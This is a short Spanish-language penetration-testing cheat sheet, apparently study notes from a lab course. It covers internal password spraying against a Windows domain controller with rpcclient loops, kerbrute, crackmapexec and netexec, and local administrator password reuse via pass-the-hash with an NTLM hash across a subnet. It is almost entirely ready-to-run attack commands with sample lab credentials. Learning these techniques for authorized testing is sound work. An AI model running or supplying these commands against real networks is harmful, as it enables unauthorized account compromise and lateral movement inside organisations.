# INTERNAL PASSWORD SPRAYING
Luego de generar una lista de users previamente enumerados:

##### BASH ONELINER RCPCLIENT:
    for u in $(cat <lista_users>);do rpcclient -U "$u%<pass>" -c "getusername;quit" <ip_DC> | grep Authority; done

##### KERBRUTE:
    kerbrute passwordspray -d <dominio> --dc <ip_dc> <lista_users>  <pass>

##### CRACKMAPEXEC:
    sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

##### Podemos después usar crackmapexec para probar si los positivos no son falsos:
    sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

##### Netexec

    netexec rdp 10.129.229.0/24 -u helen -p 'RedRiot88' -d inlanefreight.local

# LOCAL ADMINISTRATOR PASSWORD REUSE
Si conseguimos privilegios administrativos y conseguimos el NTML o el password en texto plano del admin, podemos usarlo para loguearnos en otros hosts en la red.
Usualmente se usa la misma para todas debido a las Golden images y para un manejo más facil de todas las pc del realm.

    sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
